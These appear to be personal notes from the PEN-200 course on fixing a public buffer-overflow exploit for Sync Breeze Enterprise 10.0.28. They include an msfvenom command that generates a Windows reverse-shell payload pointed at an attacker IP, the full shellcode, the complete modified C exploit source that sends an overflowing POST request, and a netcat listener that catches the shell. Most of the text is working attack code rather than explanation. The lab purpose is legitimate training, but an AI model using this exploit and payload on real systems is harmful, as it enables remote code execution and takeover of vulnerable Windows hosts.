Buffer Overflows. 

Stack-Based Buffer Overflow - Exploitation Stages

![Figure 1: Stack-Based Buffer Overflow - Exploitation Stages](https://static.offsec.com/offsec-courses/PEN-200/imgs/fixing_exploits/ad4cddbfd09316f25d3dc0ea280da168-bof_diagram.png)

Declaring a Buffer of 64 characters and moving user's data into it:

```
*buffer[64]*
...
strcpy(buffer, argv[1]);
```

Vulnerability because it does not check size of user's input. 

Instruction pointer (EIP/RIP) keeps track of current code instructions. 

If have control of it, we control the program. 

Stack-based buffer overflow steps:

1. Create a large buffer to trigger the overflow.
2. Take control of EIP by overwriting a return address on the stack, padding the large buffer with an appropriate offset.
3. Include a chosen payload in the buffer prepended by an optional NOP[5](https://portal.offsec.com/courses/pen-200-44065/learning/fixing-exploits-45086/fixing-memory-corruption-exploits-45119/buffer-overflow-in-a-nutshell-45091#fn-local_id_247-5)sled.
4. Choose a correct return address instruction such as JMP ESP (or a different register) to redirect the execution flow to the payload.

Payload will include:
- Our IP address and port number
- Exclude bad characters

**Bad characters** - ASCII or UNICODE characters that break an application because they are _control characters_. 
	Ex: `\x00` is a string terminator

### Import and Examine Exploit

#### Scenario

Target: _Sync Breeze Enterprise_ 10.0.28

Searching for available exploits for our vulnerable software using searchsploit

`searchsploit "Sync Breeze Enterprise 10.0.28"`

Result:

````
Sync Breeze Enterprise 10.0.28 - Remote Buffer Over | exploits/windows/remote/42928.py
````

Sync Breeze 10.0.28 Exploit's Summary

```
offset    = "A" * 780 
JMP_ESP   =  "\x83\x0c\x09\x10"
shellcode = "\x90"*16 + msf_shellcode
exploit   = offset + JMP_ESP + shellcode
```

Buffer overflow is triggered on POST request.

- Offset with 780 "A"s
- Overwrite instruction pointer with JMP_ESP at memory address `0x10090c83`
- Append shellcode with 16 NOPs
- Exploit included in HTTP POST and sent

Move this exploit to our working directory 

`searchsploit -m 42341`

Result:

```
Copied to: /home/kali/42341.c
```

Displaying the C headers at the beginning of the exploit code:

```
#include <inttypes.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
```

Script meant to be compiled on windows, but we can _cross compile_ exploit on Kali.

### Cross-Compiling Exploit Code 

Cross-Compiler: #mingw-w64

Installing the mingw-w64 cross-compiler in Kali

`sudo apt install mingw-w64`

Attempt to compile exploit, but it errors out.

`i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe`

Error related to "WSAStartup", a function in `winsock.h`

Adding `-lws2_32` as a flag should resolve error. 

`i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`

Successful compilation:

````
syncbreeze_exploit.exe
````

Instruct mingw-w64 to search for the _ws2_32_ DLL and include it in the final executable via static linking

Identifying the code lines responsible for the IP address and port

```
printf("[>] Socket created.\n");
server.sin_addr.s_addr = inet_addr("10.11.0.22");
server.sin_family = AF_INET;
server.sin_port = htons(80);
```

### Fixing the Exploit 

Modify return address to match our vulnerable software version. 

Use #immunitydebugger and attach the program. Click _File_> _Attach_ > _syncbrs_ process

Changing the return address in C.

```
unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83
```

Just looked up the return address:
https://www.exploit-db.com/exploits/42928

Generating our own shellcode payload with #msfvenom 

Bad characters listed in exploit file already.

Using msfvenom to generate a reverse shell payload that fits our environment

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`

Result:

````
"\xdb\xcc\xbe\xa5\xcc\x28\x99\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x31\x72\x17\x83\xc2\x04\x03\xd7\xdf\xca\x6c\xeb\x08\x88"
"\x8f\x13\xc9\xed\x06\xf6\xf8\x2d\x7c\x73\xaa\x9d\xf6\xd1\x47"
"\x55\x5a\xc1\xdc\x1b\x73\xe6\x55\x91\xa5\xc9\x66\x8a\x96\x48"
"\xe5\xd1\xca\xaa\xd4\x19\x1f\xab\x11\x47\xd2\xf9\xca\x03\x41"
"\xed\x7f\x59\x5a\x86\xcc\x4f\xda\x7b\x84\x6e\xcb\x2a\x9e\x28"
"\xcb\xcd\x73\x41\x42\xd5\x90\x6c\x1c\x6e\x62\x1a\x9f\xa6\xba"
"\xe3\x0c\x87\x72\x16\x4c\xc0\xb5\xc9\x3b\x38\xc6\x74\x3c\xff"
"\xb4\xa2\xc9\x1b\x1e\x20\x69\xc7\x9e\xe5\xec\x8c\xad\x42\x7a"
"\xca\xb1\x55\xaf\x61\xcd\xde\x4e\xa5\x47\xa4\x74\x61\x03\x7e"
"\x14\x30\xe9\xd1\x29\x22\x52\x8d\x8f\x29\x7f\xda\xbd\x70\xe8"
"\x2f\x8c\x8a\xe8\x27\x87\xf9\xda\xe8\x33\x95\x56\x60\x9a\x62"
"\x98\x5b\x5a\xfc\x67\x64\x9b\xd5\xa3\x30\xcb\x4d\x05\x39\x80"
"\x8d\xaa\xec\x07\xdd\x04\x5f\xe8\x8d\xe4\x0f\x80\xc7\xea\x70"
"\xb0\xe8\x20\x19\x5b\x13\xa3\xe6\x34\x29\x37\x8f\x46\x4d\x36"
"\xf4\xce\xab\x52\x1a\x87\x64\xcb\x83\x82\xfe\x6a\x4b\x19\x7b"
"\xac\xc7\xae\x7c\x63\x20\xda\x6e\x14\xc0\x91\xcc\xb3\xdf\x0f"
"\x78\x5f\x4d\xd4\x78\x16\x6e\x43\x2f\x7f\x40\x9a\xa5\x6d\xfb"
"\x34\xdb\x6f\x9d\x7f\x5f\xb4\x5e\x81\x5e\x39\xda\xa5\x70\x87"
"\xe3\xe1\x24\x57\xb2\xbf\x92\x11\x6c\x0e\x4c\xc8\xc3\xd8\x18"
"\x8d\x2f\xdb\x5e\x92\x65\xad\xbe\x23\xd0\xe8\xc1\x8c\xb4\xfc"
"\xba\xf0\x24\x02\x11\xb1\x45\xe1\xb3\xcc\xed\xbc\x56\x6d\x70"
"\x3f\x8d\xb2\x8d\xbc\x27\x4b\x6a\xdc\x42\x4e\x36\x5a\xbf\x22"
"\x27\x0f\xbf\x91\x48\x1a";
````

 Exploit code following the socket information, return address instruction, and payload changes

```hlt:55,31,33,69,72-97
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define DEFAULT_BUFLEN 512

#include <inttypes.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

DWORD SendRequest(char *request, int request_size) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    int iResult;

    printf("\n[>] Initialising Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("[!] Failed. Error Code : %d", WSAGetLastError());
        return 1;
    }

    printf("[>] Initialised.\n");
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("[!] Could not create socket : %d", WSAGetLastError());
    }

    printf("[>] Socket created.\n");
    server.sin_addr.s_addr = inet_addr("192.168.50.120");
    server.sin_family = AF_INET;
    server.sin_port = htons(80);

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        puts("[!] Connect error");
        return 1;
    }
    puts("[>] Connected");

    if (send(s, request, request_size, 0) < 0)
    {
        puts("[!] Send failed");
        return 1;
    }
    puts("\n[>] Request sent\n");
    closesocket(s);
    return 0;
}

void EvilRequest() {
    
    char request_one[] = "POST /login HTTP/1.1\r\n"
                        "Host: 192.168.50.120\r\n"
                        "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Accept-Language: en-US,en;q=0.5\r\n"
                        "Referer: http://192.168.50.120/login\r\n"
                        "Connection: close\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: ";
    char request_two[] = "\r\n\r\nusername=";

    int initial_buffer_size = 780;
    char *padding = malloc(initial_buffer_size);
    memset(padding, 0x41, initial_buffer_size);
    memset(padding + initial_buffer_size - 1, 0x00, 1);
    unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83
    
    
    unsigned char shellcode[] = 
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
   "\xdb\xcc\xbe\xa5\xcc\x28\x99\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
   "\x52\x31\x72\x17\x83\xc2\x04\x03\xd7\xdf\xca\x6c\xeb\x08\x88"
   "\x8f\x13\xc9\xed\x06\xf6\xf8\x2d\x7c\x73\xaa\x9d\xf6\xd1\x47"
   "\x55\x5a\xc1\xdc\x1b\x73\xe6\x55\x91\xa5\xc9\x66\x8a\x96\x48"
   "\xe5\xd1\xca\xaa\xd4\x19\x1f\xab\x11\x47\xd2\xf9\xca\x03\x41"
   "\xed\x7f\x59\x5a\x86\xcc\x4f\xda\x7b\x84\x6e\xcb\x2a\x9e\x28"
   "\xcb\xcd\x73\x41\x42\xd5\x90\x6c\x1c\x6e\x62\x1a\x9f\xa6\xba"
   "\xe3\x0c\x87\x72\x16\x4c\xc0\xb5\xc9\x3b\x38\xc6\x74\x3c\xff"
   "\xb4\xa2\xc9\x1b\x1e\x20\x69\xc7\x9e\xe5\xec\x8c\xad\x42\x7a"
   "\xca\xb1\x55\xaf\x61\xcd\xde\x4e\xa5\x47\xa4\x74\x61\x03\x7e"
   "\x14\x30\xe9\xd1\x29\x22\x52\x8d\x8f\x29\x7f\xda\xbd\x70\xe8"
   "\x2f\x8c\x8a\xe8\x27\x87\xf9\xda\xe8\x33\x95\x56\x60\x9a\x62"
   "\x98\x5b\x5a\xfc\x67\x64\x9b\xd5\xa3\x30\xcb\x4d\x05\x39\x80"
   "\x8d\xaa\xec\x07\xdd\x04\x5f\xe8\x8d\xe4\x0f\x80\xc7\xea\x70"
   "\xb0\xe8\x20\x19\x5b\x13\xa3\xe6\x34\x29\x37\x8f\x46\x4d\x36"
   "\xf4\xce\xab\x52\x1a\x87\x64\xcb\x83\x82\xfe\x6a\x4b\x19\x7b"
   "\xac\xc7\xae\x7c\x63\x20\xda\x6e\x14\xc0\x91\xcc\xb3\xdf\x0f"
   "\x78\x5f\x4d\xd4\x78\x16\x6e\x43\x2f\x7f\x40\x9a\xa5\x6d\xfb"
   "\x34\xdb\x6f\x9d\x7f\x5f\xb4\x5e\x81\x5e\x39\xda\xa5\x70\x87"
   "\xe3\xe1\x24\x57\xb2\xbf\x92\x11\x6c\x0e\x4c\xc8\xc3\xd8\x18"
   "\x8d\x2f\xdb\x5e\x92\x65\xad\xbe\x23\xd0\xe8\xc1\x8c\xb4\xfc"
   "\xba\xf0\x24\x02\x11\xb1\x45\xe1\xb3\xcc\xed\xbc\x56\x6d\x70"
   "\x3f\x8d\xb2\x8d\xbc\x27\x4b\x6a\xdc\x42\x4e\x36\x5a\xbf\x22"
   "\x27\x0f\xbf\x91\x48\x1a";

    char request_three[] = "&password=A";

    int content_length = 9 + strlen(padding) + strlen(retn) + strlen(shellcode) + strlen(request_three);
    char *content_length_string = malloc(15);
    sprintf(content_length_string, "%d", content_length);
    int buffer_length = strlen(request_one) + strlen(content_length_string) + initial_buffer_size + strlen(retn) + strlen(request_two) + strlen(shellcode) + strlen(request_three);

    char *buffer = malloc(buffer_length);
    memset(buffer, 0x00, buffer_length);
    strcpy(buffer, request_one);
    strcat(buffer, content_length_string);
    strcat(buffer, request_two);
    strcat(buffer, padding);
    strcat(buffer, retn);
    strcat(buffer, shellcode);
    strcat(buffer, request_three);

    SendRequest(buffer, strlen(buffer));
}

int main() {

    EvilRequest();
    return 0;
}
```

Recompile with

`i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`

Verifying efficacy with #immunitydebugger 

Attach program and set breakpoint at our JMP ESP address

![Figure 1: Setting a breakpoint at our JMP ESP address](https://static.offsec.com/offsec-courses/PEN-200/imgs/fixing_exploits/eef4489dbfa33e7e1af064e8df1be6a2-fixing_exploits_01.png)

Running the Windows exploit using wine

There was an issue. 

 EIP is overwritten by our return address instruction address misaligned by one byte

![Figure 2: EIP is overwritten by our return address instruction address misaligned by one byte](https://static.offsec.com/offsec-courses/PEN-200/imgs/fixing_exploits/cd398396572fb76d42e782800c768193-fixing_exploits_02.png)

### Changing the Overflow Buffer

Understanding our offset misalignment.

Basically there is an extra null byte being used to convert buffer to a string.

Memset setting the last byte to a null-terminator to convert the buffer into a string

```
memset(padding + initial_buffer_size - 1, 0x00, 1);
```

Creating the final buffer for the exploit

```
char *buffer = malloc(buffer_length);
memset(buffer, 0x00, buffer_length);
strcpy(buffer, request_one);
strcat(buffer, content_length_string);
strcat(buffer, request_two);
strcat(buffer, padding);
strcat(buffer, retn);
strcat(buffer, shellcode);
strcat(buffer, request_three);
```

Because we set padding buffer size to 780 and set the last byte to 0x00, we only get a string of A's = 779 bytes

Fix this misalignment by increasing the requested memory size defined by the _initial_buffer_size_ variable by 1

````
    int initial_buffer_size = 781;
````

Recompile the code and set up netcat listener on port 443 to catch reverse shell.

`i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`

`sudo nc -lvp 443`

`wine syncbreeze_exploit.exe`

Got reverse shell. 



